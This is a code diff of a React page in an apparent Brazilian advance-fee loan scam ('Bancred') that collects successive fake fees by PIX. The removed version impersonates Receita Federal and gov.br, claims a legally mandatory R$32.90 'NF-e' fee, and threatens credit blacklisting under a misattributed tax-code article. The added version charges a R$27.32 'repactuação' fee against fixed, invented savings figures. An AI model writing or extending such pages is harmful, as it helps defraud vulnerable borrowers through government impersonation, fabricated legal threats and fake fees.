@@ -1,13 +1,10 @@
 import { useState } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import {
-  LoaderCircle,
-  ScrollText,
-  Hash,
-  Sparkles,
-  ShieldAlert,
-  AlertCircle,
-  FileCheck,
+  TrendingDown,
+  ReceiptText,
+  CircleCheck,
+  CalendarClock,
   QrCode,
   Copy,
   Check,
@@ -16,8 +13,6 @@ import {
   Clock,
 } from "lucide-react";
 import logo from "@/assets/bancred-logo.png";
-import receitaLogo from "@/assets/receita-federal-logo.svg";
-import govbrLogo from "@/assets/govbr-logo.png";
 import { useParadisePix } from "@/hooks/useParadisePix";
 
 const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';
@@ -35,29 +30,32 @@ const PixIcon = ({ size = 20 }: { size?: number }) => (
   </svg>
 );
 
-const Up2 = () => {
+const Up3 = () => {
   const [params] = useSearchParams();
   const navigate = useNavigate();
 
   const nomeRaw = params.get("nome") || "";
   const primeiroNome = (nomeRaw.split(" ")[0] || "Cliente").toUpperCase();
-  const valorOperacao = Number(params.get("valor") || 5000);
-  const valorNFe = 32.9;
+  const valorCredito = Number(params.get("valor") || 5000);
+  const valorAntes = 6024.12;
+  const novoTotal = 4337.37;
+  const economia = 1686.75;
+  const taxaRepactuacao = 27.32;
 
   const [showPix, setShowPix] = useState(false);
   const [copied, setCopied] = useState(false);
 
   const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
-    navigate(`/up3?${params.toString()}`);
+    navigate(`/dashboard?${params.toString()}`);
   });
 
   const openPix = async () => {
     setShowPix(true);
     try {
       await create({
-        amountCents: Math.round(valorNFe * 100),
-        description: `NF-e Bancred - Emissão obrigatória`,
-        stage: "up2",
+        amountCents: Math.round(taxaRepactuacao * 100),
+        description: `Repactuação Bancred - Redução da dívida`,
+        stage: "up3",
         customer: nomeRaw ? { name: nomeRaw } : undefined,
       });
     } catch {
@@ -86,7 +84,7 @@ const Up2 = () => {
     <div
       style={{
         minHeight: "100dvh",
-        background: "#FFFBEB",
+        background: "#F4F4F7",
         fontFamily: fontStack,
         color: "#111827",
         WebkitFontSmoothing: "antialiased",
@@ -103,244 +101,110 @@ const Up2 = () => {
         <img src={logo} alt="Bancred" style={{ height: 76, width: "auto", display: "inline-block", objectFit: "contain" }} />
       </header>
 
-      <main style={{ padding: "18px 14px 28px", maxWidth: 480, margin: "0 auto" }}>
-        {/* Aprovado banner */}
-        <div
-          style={{
-            background: "linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%)",
-            borderWidth: "1px 1px 1px 4px",
-            borderStyle: "solid",
-            borderColor: "#A7F3D0 #A7F3D0 #A7F3D0 #059669",
-            borderRadius: 12,
-            padding: "12px 14px",
-            marginBottom: 14,
-            display: "flex",
-            alignItems: "center",
-            gap: 10,
-          }}
-        >
-          <LoaderCircle size={20} color="#059669" style={{ flexShrink: 0, animation: "spin 1.5s linear infinite" }} />
-          <div style={{ flex: 1 }}>
-            <div style={{ fontSize: 12.5, fontWeight: 800, color: "#065F46", marginBottom: 2 }}>
-              ✅ Empréstimo APROVADO e em processamento
-            </div>
-            <div style={{ fontSize: 11.5, color: "#047857", lineHeight: 1.4 }}>
-              Falta apenas <strong>1 etapa fiscal</strong> para o valor cair na sua conta
-            </div>
-          </div>
-        </div>
-        <style>{`@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`}</style>
-
-        {/* NF-e card */}
+      <main style={{ padding: "22px 16px", maxWidth: 480, margin: "0 auto" }}>
         <section
           style={{
-            background: "#FFFFFF",
-            borderWidth: "4px 1px 1px",
-            borderStyle: "solid",
-            borderColor: "#B45309 #FEF3C7 #FEF3C7",
-            borderRadius: 14,
-            padding: "18px 18px 16px",
+            background: "linear-gradient(160deg, #1751B5, #1C68E3)",
+            borderRadius: 22,
+            padding: "22px 18px",
+            color: "#fff",
             marginBottom: 14,
-            boxShadow: "0 10px 28px rgba(180, 83, 9, 0.08)",
-            position: "relative",
+            boxShadow: "0 14px 34px rgba(28,104,227,0.22)",
           }}
         >
           <div
             style={{
-              display: "flex",
+              display: "inline-flex",
               alignItems: "center",
-              justifyContent: "space-between",
-              borderBottom: "1px dashed #FEF3C7",
-              paddingBottom: 12,
+              gap: 6,
+              fontSize: 12,
+              fontWeight: 800,
+              background: "rgba(255,255,255,0.16)",
+              padding: "6px 10px",
+              borderRadius: 999,
               marginBottom: 14,
             }}
           >
-            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-              <ScrollText size={18} color="#B45309" />
-              <div style={{ fontSize: 11, fontWeight: 800, color: "#78350F", letterSpacing: 0.6, textTransform: "uppercase" }}>
-                Exigência Fiscal — Receita Federal
-              </div>
-            </div>
-            <div
-              style={{
-                display: "inline-flex",
-                alignItems: "center",
-                gap: 4,
-                fontSize: 10,
-                fontWeight: 700,
-                color: "#B45309",
-                background: "#FFFBEB",
-                border: "1px solid #FEF3C7",
-                padding: "4px 8px",
-                borderRadius: 6,
-              }}
-            >
-              <Hash size={10} /> 420658-NF
-            </div>
+            <TrendingDown size={14} /> Redução aprovada
           </div>
-
-          <h1 style={{ fontSize: 22, fontWeight: 900, color: "#111827", marginBottom: 8, lineHeight: 1.2 }}>
-            {primeiroNome}, seu empréstimo já foi aprovado — falta só a NF-e
+          <h1 style={{ fontSize: 23, fontWeight: 900, marginBottom: 8, lineHeight: 1.15 }}>
+            {primeiroNome}, reduza sua dívida e pague só em 2027
           </h1>
-          <p style={{ fontSize: 13.5, lineHeight: 1.55, color: "#6B7280", margin: "0 0 14px" }}>
-            Operações acima de R$&nbsp;3.000,00 são <strong style={{ color: "#78350F" }}>obrigadas por lei</strong> a emitir Nota Fiscal Eletrônica antes do repasse. Esta exigência é do <strong>Governo Federal</strong> — não é uma cobrança da Bancred.
+          <p style={{ fontSize: 13.5, lineHeight: 1.55, opacity: 0.9, margin: 0 }}>
+            Seu crédito de {formatBRL(valorCredito)} continua o mesmo. A vantagem é diminuir o total do contrato antes do saque.
           </p>
-
-          <div
-            style={{
-              background: "#FFFBEB",
-              border: "1px solid #FEF3C7",
-              borderRadius: 10,
-              padding: "12px 14px",
-              display: "grid",
-              gap: 8,
-            }}
-          >
-            {[
-              { k: "Beneficiário", v: nomeRaw ? nomeRaw.split(" ").slice(0, 2).join(" ") : "Cliente", big: false },
-              { k: "Valor da operação", v: formatBRL(valorOperacao), big: true },
-              { k: "Natureza", v: "Crédito pessoal", big: false },
-            ].map((row) => (
-              <div key={row.k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8 }}>
-                <span style={{ fontSize: 11.5, color: "#6B7280", textTransform: "uppercase", letterSpacing: 0.5, fontWeight: 600 }}>
-                  {row.k}
-                </span>
-                <span style={{ fontSize: row.big ? 15 : 13, color: "#111827", fontWeight: row.big ? 900 : 600 }}>
-                  {row.v}
-                </span>
-              </div>
-            ))}
-          </div>
         </section>
 
-        {/* Steps */}
+        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 14 }}>
+          <div
+            style={{
+              background: "#FFFFFF",
+              border: "1px solid #E5E7EB",
+              borderRadius: 16,
+              padding: 14,
+            }}
+          >
+            <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 5 }}>Antes</div>
+            <div style={{ fontSize: 17, fontWeight: 900, color: "#111827", textDecoration: "line-through" }}>
+              {formatBRL(valorAntes)}
+            </div>
+          </div>
+          <div
+            style={{
+              background: "#F0FDF4",
+              border: "1px solid #DCFCE7",
+              borderRadius: 16,
+              padding: 14,
+            }}
+          >
+            <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 5 }}>Novo total</div>
+            <div style={{ fontSize: 17, fontWeight: 900, color: "#15803D" }}>{formatBRL(novoTotal)}</div>
+          </div>
+        </div>
+
         <div
           style={{
-            background: "#FFFFFF",
+            background: "#F0FDF4",
             borderRadius: 16,
-            padding: 16,
+            padding: 18,
             boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
-            border: "1px solid #E5E7EB",
+            border: "1px solid #DCFCE7",
             marginBottom: 14,
           }}
         >
-          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 14 }}>
-            <Sparkles size={16} color="#B45309" />
-            <div style={{ fontSize: 14, fontWeight: 800, color: "#111827" }}>
-              Após o pagamento da NF-e (em até 5 minutos):
-            </div>
+          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 12 }}>
+            <ReceiptText size={20} color="#16A34A" />
+            <div style={{ fontSize: 15, fontWeight: 800, color: "#15803D" }}>Repactuação aprovada</div>
           </div>
           {[
-            "NF-e emitida automaticamente em seu CPF",
-            "Registro confirmado junto à Receita Federal",
-            `Crédito de ${formatBRL(valorOperacao)} liberado direto na sua conta`,
-          ].map((t, i) => (
-            <div key={t} style={{ display: "flex", alignItems: "flex-start", gap: 10, marginBottom: i < 2 ? 10 : 0 }}>
-              <span
-                style={{
-                  flexShrink: 0,
-                  width: 22,
-                  height: 22,
-                  borderRadius: "50%",
-                  background: "#B45309",
-                  color: "#fff",
-                  fontSize: 11,
-                  fontWeight: 800,
-                  display: "inline-flex",
-                  alignItems: "center",
-                  justifyContent: "center",
-                }}
-              >
-                {i + 1}
-              </span>
-              <div style={{ fontSize: 13, color: "#111827", lineHeight: 1.5, paddingTop: 1 }}>{t}</div>
+            `Economia estimada: ${formatBRL(economia)}`,
+            `Crédito mantido: ${formatBRL(valorCredito)}`,
+            "Primeiro pagamento somente em 2027",
+          ].map((t) => (
+            <div key={t} style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#111827", marginBottom: 7 }}>
+              <CircleCheck size={14} color="#16A34A" /> {t}
             </div>
           ))}
         </div>
 
-        {/* Warning */}
-        <div
-          style={{
-            background: "#FEF2F2",
-            borderWidth: "1.5px 1.5px 1.5px 4px",
-            borderStyle: "solid",
-            borderColor: "#FCA5A5 #FCA5A5 #FCA5A5 #DC2626",
-            borderRadius: 10,
-            padding: 14,
-            marginBottom: 14,
-            display: "flex",
-            gap: 10,
-          }}
-        >
-          <ShieldAlert size={22} color="#DC2626" style={{ flexShrink: 0, marginTop: 1 }} />
-          <div style={{ fontSize: 12.5, color: "#7F1D1D", lineHeight: 1.55 }}>
-            <div style={{ fontWeight: 900, fontSize: 13, marginBottom: 6, color: "#991B1B", textTransform: "uppercase", letterSpacing: 0.3 }}>
-              ⚠️ Atenção: prazo de 24h
-            </div>
-            O não pagamento da NF-e dentro do prazo resulta em <strong>inscrição automática do CPF nos órgãos de proteção ao crédito (SPC e Serasa)</strong>, conforme o Art. 39 do Código Tributário Nacional. Seu nome ficará <strong>negativado</strong> e o empréstimo aprovado será <strong>cancelado sem possibilidade de reabertura</strong>.
-          </div>
-        </div>
-
-        {/* Info Bancred não recebe */}
-        <div
-          style={{
-            background: "#FFFBEB",
-            borderWidth: "1px 1px 1px 4px",
-            borderStyle: "solid",
-            borderColor: "#FEF3C7 #FEF3C7 #FEF3C7 #B45309",
-            borderRadius: 10,
-            padding: "12px 14px",
-            marginBottom: 14,
-            display: "flex",
-            gap: 10,
-          }}
-        >
-          <AlertCircle size={20} color="#B45309" style={{ flexShrink: 0, marginTop: 1 }} />
-          <div style={{ fontSize: 12.5, color: "#78350F", lineHeight: 1.55 }}>
-            O valor da NF-e é repassado diretamente à Receita Federal. A Bancred <strong>não recebe nada</strong> dessa taxa — é uma exigência exclusiva do Governo.
-          </div>
-        </div>
-
-        {/* Valor */}
         <div
           style={{
             background: "#FFFFFF",
-            border: "1px solid #FEF3C7",
-            borderRadius: 14,
-            padding: "16px 18px",
+            borderRadius: 16,
+            padding: 18,
+            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
+            border: "1px solid #E5E7EB",
             marginBottom: 18,
-            position: "relative",
-            overflow: "hidden",
           }}
         >
-          <div
-            style={{
-              position: "absolute",
-              top: 12,
-              right: 12,
-              padding: "4px 10px",
-              border: "1.5px solid #B45309",
-              color: "#B45309",
-              borderRadius: 6,
-              fontSize: 10,
-              fontWeight: 900,
-              letterSpacing: 1,
-              textTransform: "uppercase",
-              transform: "rotate(-6deg)",
-              opacity: 0.85,
-            }}
-          >
-            A Pagar
+          <div style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#6B7280", marginBottom: 4 }}>
+            <CalendarClock size={14} /> Taxa de repactuação
           </div>
-          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
-            <FileCheck size={16} color="#B45309" />
-            <div style={{ fontSize: 12, color: "#6B7280", fontWeight: 600 }}>Taxa de emissão da NF-e</div>
+          <div style={{ fontSize: 34, fontWeight: 900, color: "#1C68E3", marginBottom: 8 }}>
+            {formatBRL(taxaRepactuacao)}
           </div>
-          <div style={{ fontSize: 36, fontWeight: 900, color: "#78350F", lineHeight: 1, marginBottom: 6 }}>
-            {formatBRL(valorNFe)}
-          </div>
-          <div style={{ fontSize: 12, color: "#6B7280", lineHeight: 1.5 }}>
-            Valor único e final. Sem mensalidades, sem cobranças adicionais.
+          <div style={{ fontSize: 13, lineHeight: 1.5, color: "#6B7280" }}>
+            Confirma a redução da dívida e o início das parcelas em 2027.
           </div>
         </div>
 
@@ -367,19 +231,8 @@ const Up2 = () => {
             minHeight: 52,
           }}
         >
-          <PixIcon size={20} /> Emitir NF-e e liberar crédito
+          <PixIcon size={20} /> Ativar redução por PIX
         </button>
-
-        <footer style={{ marginTop: 22, textAlign: "center" }}>
-          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 18, marginBottom: 10 }}>
-            <img src={receitaLogo} alt="Receita Federal do Brasil" style={{ height: 64, width: "auto", opacity: 0.85, display: "block" }} />
-            <div style={{ width: 1, height: 46, background: "#E5E7EB" }} />
-            <img src={govbrLogo} alt="gov.br" style={{ height: 32, width: "auto", opacity: 0.9, display: "block" }} />
-          </div>
-          <div style={{ fontSize: 10.5, lineHeight: 1.5, color: "#6B7280", maxWidth: 320, margin: "0 auto" }}>
-            Documento emitido em conformidade com as normas da Receita Federal do Brasil. Operação registrada e auditável.
-          </div>
-        </footer>
       </main>
 
       {showPix && (
@@ -415,7 +268,7 @@ const Up2 = () => {
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
               <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                 <PixIcon size={22} />
-                <span style={{ fontSize: 18, fontWeight: 700 }}>Pagar NF-e com PIX</span>
+                <span style={{ fontSize: 18, fontWeight: 700 }}>Ativar redução com PIX</span>
               </div>
               <button
                 type="button"
@@ -442,7 +295,7 @@ const Up2 = () => {
               <div>
                 <div style={{ fontSize: 12, color: "#15803D", fontWeight: 600 }}>Valor a pagar</div>
                 <div style={{ fontSize: 24, fontWeight: 800, color: "#16A34A", letterSpacing: -0.4 }}>
-                  {formatBRL(valorNFe)}
+                  {formatBRL(taxaRepactuacao)}
                 </div>
               </div>
               <div
@@ -467,6 +320,7 @@ const Up2 = () => {
               <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "40px 0" }}>
                 <Loader2 size={42} color="#1C68E3" style={{ animation: "spin 1s linear infinite" }} />
                 <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>{pixError ? pixError : "Gerando seu código PIX..."}</div>
+                <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
               </div>
             ) : (
               <>
@@ -541,4 +395,4 @@ const Up2 = () => {
   );
 };
 
-export default Up2;
+export default Up3;
